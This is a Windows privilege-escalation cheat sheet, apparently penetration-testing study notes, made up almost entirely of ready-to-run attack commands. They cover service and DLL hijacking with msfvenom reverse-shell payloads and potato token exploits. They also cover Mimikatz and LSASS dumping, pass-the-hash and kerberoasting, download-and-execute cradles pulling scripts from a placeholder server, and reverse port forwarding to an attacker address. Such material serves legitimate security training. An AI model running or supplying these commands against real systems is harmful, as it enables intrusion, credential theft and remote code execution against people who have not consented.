# Windows Privilege Escalation Guide

## Attack Vectors and Tools

| Attack Vector | Path to Admin/SYSTEM | Tools | Key Commands |
|--------------|---------------------|--------|--------------|
| Unquoted Service Path | 1. Identify unquoted paths<br>2. Verify write permissions<br>3. Create malicious executable<br>4. Place in path<br>5. Wait/restart service | wmic, PowerUp, accesschk | `wmic service get name,pathname`<br>`.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *` |
| Weak Service Permissions | 1. Enumerate service permissions<br>2. Check for SERVICE_CHANGE_CONFIG<br>3. Modify service binary path<br>4. Start service | accesschk, sc, PowerUp | `sc qc <service>`<br>`sc config <service> binpath="C:\path\evil.exe"` |
| DLL Hijacking | 1. Monitor DLL loading with Procmon<br>2. Identify missing DLLs<br>3. Check write permissions<br>4. Create malicious DLL<br>5. Place DLL and restart service | Procmon, msfvenom | `msfvenom -p windows/x64/shell_reverse_tcp -f dll`<br>`procmon.exe /accepteula` |
| Kernel Exploits | 1. Get system info<br>2. Check missing patches<br>3. Find matching exploit<br>4. Compile/transfer exploit<br>5. Execute | Watson, WES-NG, systeminfo | `systeminfo`<br>`wes.py systeminfo.txt -i "Elevation of Privilege"` |
| Token Impersonation | 1. Check token privileges<br>2. Verify SeImpersonate/SeAssignPrimary<br>3. Use appropriate potato exploit | JuicyPotato, PrintSpoofer, RoguePotato | `whoami /priv`<br>`PrintSpoofer.exe -i -c cmd` |
| AlwaysInstallElevated | 1. Check registry settings<br>2. Verify both keys enabled<br>3. Create malicious MSI<br>4. Install with elevation | reg query, msfvenom, msiexec | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`<br>`msiexec /quiet /qn /i evil.msi` |
| SAM/SYSTEM Access | 1. Locate SAM/SYSTEM files<br>2. Extract hashes<br>3. Pass-the-hash or crack | Mimikatz, secretsdump.py | `secretsdump.py local -sam sam.save -system system.save`<br>`pth-winexe --system -U 'admin%hash' //IP cmd` |
| Scheduled Tasks | 1. Enumerate non-standard tasks<br>2. Check task permissions<br>3. Modify task binary/script | schtasks, accesschk | `schtasks /query /fo LIST /v`<br>`Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"}` |
| Registry Autoruns | 1. Enumerate autorun locations<br>2. Check write permissions<br>3. Plant payload | autoruns.exe, PowerUp | `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`<br>`Get-ModifiableRegistryAutoRun` |
| Startup Applications | 1. Check startup folders<br>2. Verify write permissions<br>3. Create shortcut to payload | accesschk, PowerUp | `accesschk.exe -w "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"` |

## 1.0 Local Enumeration Techniques

### OS & Environment
```powershell
## Basic System Information
systeminfo ## OS version, build info, memory, patch details, architecture
whoami ## Current user
whoami /groups ## Current user, groups, privileges
whoami /priv ## List privileges (SeImpersonate, SeAssignPrimaryToken, etc.)
hostname ## Local computer name
echo %username% ## Current user
echo %userdomain% ## Domain name
[environment]::Is64BitOperatingSystem ## Check if OS is 64-bit
[environment]::Is64BitProcess ## Check if process is 64-bit
$ExecutionContext.SessionState.LanguageMode ## PowerShell language mode
set ## List environment variables
Get-Clipboard ## View clipboard contents

wmic product get name

sc qc <service> # Look for LocalSystem which is NT/System


## Important Windows Processes
# smss.exe - Session Manager Subsystem
# csrss.exe - Client Server Runtime Subsystem
# winlogon.exe - WinLogon
# LSASS - Local Security Authority Subsystem Service
# svchost.exe - Service Host

```

### 1.1 Networking
```powershell
ipconfig /all ## Network adapter settings (IPs, DNS, DHCP)
ipconfig /displaydns ## View DNS cache
arp -a ## ARP table
route print ## Routing table
netstat -ano ## Open connections
netstat -ano | findstr LISTENING ## Filter listening ports
netsh advfirewall show allprofiles ## Current firewall profiles/config
```

### 1.2 Users & Groups
```powershell
net user ## List local users
net user [username] ## Details about specific user
net user /domain ## List domain users
net localgroup ## List local groups
net localgroup administrators ## List users in Administrators group
net group /domain ## List domain groups
net group "Domain Controllers" ## List domain controllers
```

### 1.3 Processes & Services
```powershell
Get-Process ## Lists running processes
tasklist ## Lists running processes
tasklist /svc ## Lists processes with services (check smss.exe, csrss.exe, winlogon.exe, LSASS, svchost.exe)
net start ## List running services
sc query state= all ## Detailed service info
wmic process get name,executablepath,commandline ## Process command lines
```

### 1.4 Registry
```powershell
reg query HKCU\Software /s /f "PuTTY" ## Search for PuTTY keys
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s ## PuTTY sessions
Get-ItemProperty -Path 'HKCU:\Software' -Name '*PuTTY*' -ErrorAction SilentlyContinue ## PuTTY items
Get-Acl "HKLM:\System\CurrentControlSet\Services\regsvc" | Format-List ## Service ACL
```

### 1.5 Scheduled Tasks
```powershell
schtasks /query /fo LIST /v ## List scheduled tasks
# Task monitoring script
$logFile = "C:\Users\Documents\scheduled_tasks_watch.txt"
while ($true) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Get-ScheduledTask | Where-Object {$_.State -eq 'Running'} | ForEach-Object {
        "$timestamp - TaskName: $($_.TaskName), State: $($_.State)" | Tee-Object -FilePath $logFile -Append
    }
    Start-Sleep -Seconds 2
}

One liner of above
while ($true) { $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; Get-ScheduledTask | Where-Object {$_.State -eq 'Running'} | ForEach-Object { "$timestamp - TaskName: $($_.TaskName), State: $($_.State)" | Tee-Object -FilePath "C:\Users\Documents\scheduled_tasks_watch.txt" -Append }; Start-Sleep -Seconds 2 }
```
### 1.6 Updates & Patches
```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn ## List hotfixes
Get-HotFix ## PowerShell updates list
[System.Environment]::OSVersion.Version ## OS version
```
### 1.7 PowerShell Specific
```powershell
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt ## Command history
(Get-PSReadlineOption).HistorySavePath ## History file path
type((Get-PSReadlineOption).HistorySavePath) ## Display history
Get-History ## View command history
Get-Module ## Loaded modules
Get-ExecutionPolicy -List ## Execution policies
Set-ExecutionPolicy Bypass -Scope Process ## Bypass execution policy

# Color settings
Set-PSReadLineOption -Colors @{
    Command = "Yellow"
    Operator = "Cyan"
    Parameter = "Green"
    String = "Magenta"
    Variable = "White"
    Type = "Blue"
    Number = "DarkCyan"
}
# One liner for above
Set-PSReadLineOption -Colors @{Command="Yellow";Operator="Cyan";Parameter="Green";String="Magenta";Variable="White";Type="Blue";Number="DarkCyan"}
```
### Applications
```powershell
wmic product get name,version ## Installed programs
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname ## x64 programs
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname ## x86 programs
wmic startup get caption,command ## Startup programs
```

### Network Shares & Sessions
```powershell
net use ## Mounted drives
net share ## Shared resources
net session ## Current network sessions (admin required)
```
### Other Enumeration
```powershell
query user ## Logged-in users
wevtutil el ## List event logs
auditpol /get /category:* ## Audit policy
systeminfo | findstr /B /C:"Domain" ## Domain from systeminfo
nltest /dsgetdc: ## Domain controller info
nltest /domain_trusts ## Domain trusts
Get-ChildItem "C:\" *.lnk -Recurse -Force -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName ## Find shortcuts
Get-ChildItem -Path C:\ -Recurse -Force | Where-Object { $_.Name -eq "SAM" } ## Find SAM
Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue ## Check user directories
Get-MpComputerStatus ## Windows Defender status
Get-MpPreference | Select-Object -Property ExclusionPath ## AV exclusions
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections ## AppLocker rules
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone ## Test AppLocker rules
```
### Token Privileges and Impersonation

#### Key Token Privileges
```powershell
# Token Types
whoami /priv  # List current privileges
whoami /groups  # List group memberships

# Critical Privileges
SeImpersonatePrivilege        # Use with JuicyPotato, PrintSpoofer
SeAssignPrimaryPrivilege      # Similar to SeImpersonate
SeBackupPrivilege            # Read access to all files
SeRestorePrivilege           # Write access to all objects
SeCreateTokenPrivilege       # Create arbitrary tokens
SeLoadDriverPrivilege        # Load kernel drivers
SeTakeOwnershipPrivilege    # Take ownership of objects
SeDebugPrivilege            # Access other processes
SeTcbPrivilege             # Act as part of OS
```
#### Token Manipulation Techniques
```powershell
# Named Pipe Impersonation
# 1. Create named pipe
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream("pipe")
$pipe.WaitForConnection()

# 2. Get client token
$token = $pipe.GetImpersonationUserToken()

# Token Duplication
# Using Mimikatz
privilege::debug
token::elevate /domainadmin

# Using Incognito
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe

# Potato Attacks
PrintSpoofer64.exe -i -c cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *
RoguePotato.exe -r 10.10.10.10 -e "cmd.exe" -l 9999
```

#### Process Injection for Token Theft
```powershell
# Using PowerSploit
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

# Using Process Explorer
# 1. Find SYSTEM process
# 2. Open handle to process
# 3. Duplicate token
# 4. Create process with token
```

### Credential Hunting
Important privileges to check for privilege escalation:
- SeImpersonatePrivilege - Can impersonate access tokens (JuicyPotato)
- SeAssignPrimaryPrivilege - Similar to SeImpersonate, usable with JuicyPotato
- SeBackupPrivilege - Grants read access to all objects regardless of ACL
- SeRestorePrivilege - Grants write access to all objects
- SeTakeOwnershipPrivilege - Allows taking ownership of any object
- SeTcbPrivilege - Operating as part of the OS
- SeCreateTokenPrivilege - Create arbitrary tokens
- SeDebugPrivilege - Used by getsystem
- SeLoadDriverPrivilege - Load kernel drivers

### Active Directory
```powershell
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Set-Content adusers.txt ## List domain users
Get-Content .\adusers.txt | select -First 10 ## View first 10 users
Get-ADUser -Filter * -Property DisplayName | Select-Object DisplayName ## Alt domain users
Get-NetDomain ## Domain info
Get-NetDomainController ## DC info
Get-DomainUser -SPN ## Users with SPNs
```

## 2.0 File System Enumeration

### 2.1 Basic Navigation
```powershell
cd C:\ ## Root directory
cd C:\inetpub ## IIS directory
cd "C:\Program Files" ## Program Files
cd "C:\Program Files (x86)" ## Program Files (x86)
$sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value; cd "C:\`$Recycle.bin\$sid" ## Recycle Bin
```

### 2.2 Comprehensive File Searches
```powershell
# Sensitive File Types
Get-ChildItem -Path C:\ -Include *.kdbx,*.ppk,*.bak,*.sql,*.config,*.ini,*.log,*.xml -File -Recurse -ErrorAction SilentlyContinue

# Credential Files
Get-ChildItem -Path C:\ -Include web.config,applicationHost.config,SAM,SYSTEM,unattended.xml,*.gpg,*.pgp,*cred*,*pass* -File -Recurse -ErrorAction SilentlyContinue

# Configuration Files
Get-ChildItem -Path C:\ -Include *.config,*.conf,*.cnf,*.ini,*.txt,*.cfg -File -Recurse -ErrorAction SilentlyContinue

# Database Files
Get-ChildItem -Path C:\ -Include *.sql,*.db,*.db3,*.sqlite,*.sqlite3 -File -Recurse -ErrorAction SilentlyContinue

# Common Locations
$locations = @(
    "C:\Users\*\Documents",
    "C:\Users\*\Desktop",
    "C:\Users\*\AppData\Roaming",
    "C:\Windows\System32\config",
    "C:\Windows\repair",
    "C:\Windows\debug",
    "C:\inetpub",
    "C:\xampp"
)

foreach ($loc in $locations) {
    Get-ChildItem -Path $loc -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
}

# Registry Searches
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
Get-ChildItem -Path HKLM:\SOFTWARE -Recurse -ErrorAction SilentlyContinue | 
    Get-ItemProperty | Select-Object PSPath, PSChildName |
    Where-Object {$_.PSChildName -match "password"}
```powershell
# Find sensitive files
Get-ChildItem -Path C:\ -Include *.kdbx,*.ppk -File -Recurse -ErrorAction SilentlyContinue ## KeePass and PuTTY keys
Get-ChildItem -Path C:\ -Filter "unattended.xml" -File -Recurse ## Unattend files
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse ## XAMPP configs
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log -File -Recurse ## User files
Get-ChildItem -Path C:\Windows.old\Users -Include *.txt,*.ini,*.log -File -Recurse ## Old Windows files
Get-ChildItem -Path "C:\" -Filter "index.html","default.html" -Recurse ## Web roots
Get-ChildItem -Path C:\ -Filter "backup" -Recurse ## Backup files
Get-ChildItem -Path C:\ -Filter "OMLs.db3" -File -Recurse ## Database files
```

### 2.3 Content Searches
```powershell
# Search file contents
findstr /si password *.xml *.ini *.txt *.config *.json *.env *.yaml *.yml *.php *.js *.py *.sql *.md *.log > password_results.txt ## Find passwords
findstr /si /s "password" *.xml *.ini *.txt *.config *.json *.env *.yaml *.yml *.php *.js *.py *.sql *.md *.log ## Recursive password search
```

## Automation Tools

### Initial Enumeration Tools
| Tool | Description | Commands |
|------|-------------|----------|
| Seatbelt | C# project for performing a wide variety of local privilege escalation checks | `.\Seatbelt.exe all`<br>`.\Seatbelt.exe -group=all -full > output.txt`<br>`.\Seatbelt.exe NonStandardServices` |
| WinPEAS | Script that searches for possible paths to escalate privileges on Windows hosts | `winPeas.exe userinfo`<br>`winPeas.exe systeminfo`<br>`winPeas.exe processesinfo`<br>`winPeas.exe servicesinfo`<br>`winPeas.exe applicationsinfo`<br>`winPeas.exe networkinfo`<br>`winPeas.exe windowscreds`<br>`winPeas.exe browserinfo` |
| PowerUp | PowerShell script for finding common Windows privilege escalation vectors | `Import-Module .\PowerUp.ps1`<br>`Invoke-AllChecks`<br>`Get-ServiceUnquoted`<br>`Get-ServiceFilePermission`<br>`Get-ModifiableService` |

### Active Directory Tools
| Tool | Description | Commands |
|------|-------------|----------|
| BloodHound/SharpHound | AD Privilege Escalation Path Finder | `Import-Module .\SharpHound.ps1`<br>`Invoke-BloodHound -CollectionMethod All` |
| PowerView | AD Enumeration and Exploitation | `Import-Module .\PowerView.ps1`<br>`Get-NetDomain`<br>`Get-NetUser`<br>`Find-DomainUserLocation` |
| Rubeus | Kerberos Exploitation Tool | `.\Rubeus.exe kerberoast /outfile:hashes.txt` |
| ADExplorer | AD Visualization and Management | GUI-based tool |
| Netexec | Network Service Exploitation | `netexec smb 192.168.1.0/24 -u user -p pass` |

### Post-Exploitation Tools
| Tool | Description | Commands |
|------|-------------|----------|
| Mimikatz | Credential Extraction and Token Manipulation | `privilege::debug`<br>`sekurlsa::logonpasswords` |
| LaZagne | Password Recovery | `.\LaZagne.exe all` |
| SessionGopher | Session Information Extraction | `Import-Module .\SessionGopher.ps1`<br>`Invoke-SessionGopher -AllDomain` |
| ProcDump | Process Memory Dumping | `procdump.exe -ma lsass.exe lsass.dmp` |

| Tool          | Description                                                                                              | Commands                                                                                                                                                                                                                                  |
| ------------- | -------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Seatbelt      | C# project for performing a wide variety of local privilege escalation checks                            | `.\Seatbelt.exe all`<br>`.\Seatbelt.exe -group=all -full > output.txt`<br>`.\Seatbelt.exe NonStandardServices`                                                                                                                            |
| WinPEAS       | Script that searches for possible paths to escalate privileges on Windows hosts                          | `winPeas.exe userinfo`<br>`winPeas.exe systeminfo`<br>`winPeas.exe processesinfo`<br>`winPeas.exe servicesinfo`<br>`winPeas.exe applicationsinfo`<br>`winPeas.exe networkinfo`<br>`winPeas.exe windowscreds`<br>`winPeas.exe browserinfo` |
| PowerUp       | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations | `IEX (New-Object Net.WebClient).DownloadString('http://<server>/PowerUp.ps1')`<br>`Invoke-AllChecks`<br>`Get-ServiceUnquoted`<br>`Get-ServiceFilePermission`<br>`Get-ModifiableService`<br>`Test-ServiceDaclPermission`                   |
| SharpUp       | C# version of PowerUp                                                                                    | `.\SharpUp.exe audit`<br>`.\SharpUp.exe HijackablePaths`<br>`.\SharpUp.exe audit HijackablePaths`                                                                                                                                         |
| JAWS          | PowerShell script for enumerating privilege escalation vectors (PS 2.0)                                  | `IEX (New-Object Net.WebClient).DownloadString('http://<server>/jaws-enum.ps1')`                                                                                                                                                          |
| SessionGopher | PowerShell tool that finds and decrypts saved session information for remote access tools                | `IEX (New-Object Net.WebClient).DownloadString('http://<server>/SessionGopher.ps1')`<br>`Invoke-SessionGopher -AllDomain`                                                                                                                 |
| Watson        | .NET tool designed to enumerate missing KBs and suggest exploits                                         | `.\Watson.exe`                                                                                                                                                                                                                            |
| LaZagne       | Tool for retrieving stored passwords from browsers, databases, files, etc.                               | `.\LaZagne.exe all`                                                                                                                                                                                                                       |
| WES-NG        | Windows Exploit Suggester based on systeminfo output                                                     | `systeminfo > systeminfo.txt`<br>`python3 wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only`                                                                                                                              |
| Sysinternals  | Suite of Windows administration tools including AccessChk                                                | `accesschk.exe /accepteula -uwq "C:\Program Files"`<br>`accesschk.exe /accepteula -uwcqv "Authenticated Users" *`<br>`accesschk.exe /accepteula -wv "C:\Path\To\Service\Binary.exe"`                                                      |

## Active Directory Attack Tools

### Enumeration Tools
```powershell
# BloodHound/SharpHound
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Find-DomainUserLocation

# Lateral Movement
netexec smb <target> -u user -p pass
netexec ldap <target> -u user -p pass --bloodhound --collection All
```

### Kerberos Attack Tools
```powershell
# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt
.\Rubeus.exe asreproast /format:hashcat

# Impacket Tools
python3 GetUserSPNs.py domain/user:pass@target -request
python3 secretsdump.py domain/user:pass@target
python3 psexec.py domain/user:pass@target
python3 wmiexec.py domain/user:pass@target
```

### Credential Attacks
```powershell
# Extract and Pass Credentials
mimikatz # sekurlsa::logonpasswords
crackmapexec smb <target> -u user -H HASH
evil-winrm -i <target> -u user -p pass

# LAPS Password Extraction
Get-LAPSPasswords
python3 getLAPSPassword.py -u user -p pass -d domain
```

## System Management

### Shutdown Commands
```powershell
shutdown /r /t 0 ## Immediate restart
shutdown /s /t 0 ## Immediate shutdown
shutdown /r /f /t 0 ## Force restart
shutdown /s /f /t 0 ## Force shutdown
Restart-Computer -Force ## PowerShell restart
Stop-Computer -Force ## PowerShell shutdown
```

## File Transfer Methods

```powershell
# PowerShell Downloads
Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"
(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename")

# PowerShell Script Execution in Memory
IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')

# PowerShell with Proxy
$browser = New-Object System.Net.WebClient;
$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString('https://server/script.ps1'));

# Non-interactive FTP
echo open 10.10.10.11 21> ftp.txt
echo USER username>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo GET filename>> ftp.txt
echo bye>> ftp.txt
ftp -v -n -s:ftp.txt

# CertUtil
certutil.exe -urlcache -split -f https://myserver/filename outputfilename
certutil.exe -encode inputFileName encodedOutputFileName
certutil.exe -decode encodedInputFileName decodedOutputFileName
```

## Network Port Forwarding
```powershell
# Using plink.exe
plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS

# Using SSH (Windows 10 1803+)
ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
```

## Credential Hunting

### Memory Credential Extraction
```powershell
# Create LSASS Dump
.\procdump.exe -ma lsass.exe lsass.dmp
# Use Mimikatz offline
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords"

# Browser Credentials
.\lazagne.exe browsers

# Stored Credentials
cmdkey /list
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

### Registry Credentials
```powershell
# Common Registry Locations
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password

# PowerShell Registry Search
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | Select-Object "Default*"
```

### Configuration Files
```powershell
# Web Configuration
Get-ChildItem -Path C:\inetpub -Include web.config -File -Recurse
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse

# Unattended Installation Files
Get-ChildItem -Path C:\ -Include Unattend.xml,UnattendedSetup.xml -File -Recurse

# McAfee SiteList.xml
Get-ChildItem -Path C:\ -Include SiteList.xml -File -Recurse
```

## Enumeration Checklist

### Initial Access Validation
1. System Information
   - Full system info (`systeminfo`)
   - Architecture (`[environment]::Is64BitOperatingSystem`)
   - Patch level (`wmic qfe`)
   - Environment variables (`set`)

2. Security Controls
   - Windows Defender (`Get-MpComputerStatus`)
   - AppLocker (`Get-AppLockerPolicy -Effective`)
   - PowerShell restrictions (`$ExecutionContext.SessionState.LanguageMode`)
   - UAC Settings (`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`)

3. User Context
   - Current privileges (`whoami /priv`)
   - Group memberships (`whoami /groups`)
   - Local users (`net user`)
   - Local administrators (`net localgroup administrators`)
   - Token information (`whoami /all`)

4. Network Information
   - Network configuration (`ipconfig /all`)
   - Routing (`route print`)
   - Network connections (`netstat -ano`)
   - Firewall status (`netsh advfirewall show allprofiles`)
   - Hidden services (`netstat -ano | findstr LISTENING`)

5. Credential Hunting
   - PowerShell history (`type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`)
   - Clipboard content (`Get-Clipboard`)
   - Saved credentials (`cmdkey /list`)
   - Registry credentials (`reg query HKLM /f password /t REG_SZ /s`)
   - SAM/SYSTEM files
   - Configuration files (`dir /s *pass* == *.config*`)

### Service Attack Surface
1. Service Enumeration
   - Non-standard services (`wmic service get name,displayname,pathname,startmode`)
   - Service permissions (`accesschk.exe -uwcqv "Authenticated Users" *`)
   - Unquoted paths (`wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\"`)
   - Registry permissions (`Get-Acl HKLM:\System\CurrentControlSet\Services\* | Format-List`)

2. Application Analysis
   - Installed applications (`wmic product get name,version`)
   - Startup applications (`Get-CimInstance Win32_StartupCommand`)
   - Running processes (`Get-Process | where {$_.ProcessName -notlike "svchost*"}`)
   - Vulnerable drivers (`driverquery /v`)

3. File System Access
   - Writable directories (`accesschk.exe -uws "Everyone" "C:\Program Files"`)
   - Hidden files (`dir /A:H /s C:\`)
   - Backup files (`dir /s *backup*`)
   - Config files (`dir /s *.config`)

### Advanced Checks
1. Token Privileges
   - SeImpersonatePrivilege
   - SeAssignPrimaryPrivilege
   - SeBackupPrivilege
   - SeRestorePrivilege
   - SeCreateTokenPrivilege
   - SeLoadDriverPrivilege
   - SeTakeOwnershipPrivilege
   - SeDebugPrivilege

2. Registry Checks
   - AlwaysInstallElevated
   - Stored credentials
   - AutoLogon settings
   - Service settings

3. Scheduled Tasks
   - Non-standard tasks (`schtasks /query /fo LIST /v`)
   - Task permissions
   - Binary permissions

4. Memory Analysis
   - LSASS dumping (`procdump.exe -ma lsass.exe lsass.dmp`)
   - Mimikatz offline mode
   - Process memory scanning

## Notes and Best Practices
- Check C:\Windows\Temp - often writable by BUILTIN\Users and safe for uploading files
- When stuck, consider running SharpHound or pivoting back to initial access vector
- Groups can belong to other groups - check group nesting
- To escalate from admin user to SYSTEM, use PsExec
- Disabled status in whoami /priv output is irrelevant - focus on privilege presence
- Check user directories on all accessible drives
- Test commands against target AV before running them
- Document all findings systematically
- Always verify permissions before accessing sensitive files
- Remember to check both legacy and PowerShell versions of commands
- Examine user startup folders in AppData
- Consider searching for "admin", "root", "login" terms
- Document all findings
- Test commands against target AV
- Look for non-standard file extensions
- Verify permissions before accessing sensitive files